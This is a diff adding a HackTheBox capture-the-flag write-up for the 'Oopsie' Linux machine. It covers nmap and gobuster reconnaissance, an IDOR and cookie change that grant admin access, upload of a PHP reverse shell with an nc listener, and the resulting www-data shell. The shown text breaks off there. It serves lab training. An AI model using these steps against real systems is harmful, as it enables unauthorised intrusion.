@@ -1,3 +1,88 @@
+# Oopsie
+
+**Platform:** HackTheBox  
+**OS:** Linux  
+**Difficulty:** Easy  
+**Date:** April 2026
+
+---
+
+## Summary
+
+Linux machine running a web application with broken access control.
+Cookie manipulation allows privilege escalation within the app, 
+leading to file upload abuse and a reverse shell. Credentials found 
+in a config file allow lateral movement to a local user. A SUID 
+binary with an insecure system call leads to full root compromise.
+
+---
+
+## 1. Reconnaissance
+
+Port scan using nmap:
+```bash
+nmap -sCV -p- -A 10.129.18.148
+```
+
+**Open ports:**
+
+| Port | Service | Version |
+|------|---------|---------|
+| 22 | SSH | OpenSSH 7.6p1 |
+| 80 | HTTP | Apache 2.4.29 |
+
+---
+
+## 2. Web Enumeration
+
+Discovered login page using Gobuster:
+```bash
+gobuster dir -u http://10.129.18.148 -w /usr/share/wordlists/dirb/common.txt
+```
+
+Found: `/cdn-cgi/login`
+
+Logged in as guest with default credentials.
+
+---
+
+## 3. Access Control Bypass (IDOR)
+
+Navigated to the accounts section:
+/cdn-cgi/login/admin.php?content=accounts&id=1
+
+Found admin user Access ID by changing the `id` parameter.
+This is an **IDOR (Insecure Direct Object Reference)** vulnerability.
+
+Modified cookies in Firefox DevTools (F12 → Storage → Cookies):
+
+| Cookie | Value |
+|--------|-------|
+| role | admin |
+| user | 34322 |
+
+Gained access to the upload page.
+
+---
+
+## 4. Reverse Shell Upload
+
+Prepared PHP reverse shell:
+```bash
+cp /usr/share/webshells/php/php-reverse-shell.php shell.php
+nano shell.php  # Set $ip and $port
+```
+
+Uploaded shell.php through the upload page.
+
+Started listener:
+```bash
+nc -lvnp 1234
+```
+
+Triggered the shell:
+http://10.129.18.148/uploads/shell.php
+
 Received connection as **www-data**.
 
 Upgraded to interactive shell:
